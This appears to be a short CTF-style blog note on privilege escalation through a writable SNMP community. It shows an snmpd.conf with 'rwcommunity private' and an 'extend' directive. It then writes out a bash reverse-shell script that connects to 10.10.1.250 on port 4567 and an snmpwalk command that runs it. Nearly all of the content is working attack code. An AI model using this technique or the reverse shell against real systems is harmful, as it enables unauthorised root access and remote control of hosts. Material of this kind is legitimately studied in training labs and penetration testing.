---
description: >-
  SNMP Read and Write Community Abuse
title: SNMP Read and Write Community Abuse              # Add title here
date: 2022-09-02 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, SNMP Read and Write Community Abuse]                     # Change Templates to Writeup
tags: [firefox, snmp, snmp read and write community abuse]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### SNMP Priv Escalation

If port 161 is open internally you can search for the /etc/snmp/snmpd.conf file and review its content, notice that private community is read and writable:

```text
rocommunity public default
rwcommunity private default
extend etsctf /tmp/snmpd-tests.sh
```

If the extend permissions is configured then you can execute commands from within the folder by creating/modifying the file with following content:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.1.250/4567 0>&1'
```

Don't forget to set the permissions of the script (chmod +x).
Then by executing the snmpwalk to retrieve the files, the reverse shell will be created:
```bash
snmpwalk localhost -c private -v1 . -On 
```

Examples:
[ECHO CTF Nopal](https://echoctf.red/target/38/writeup/read/37)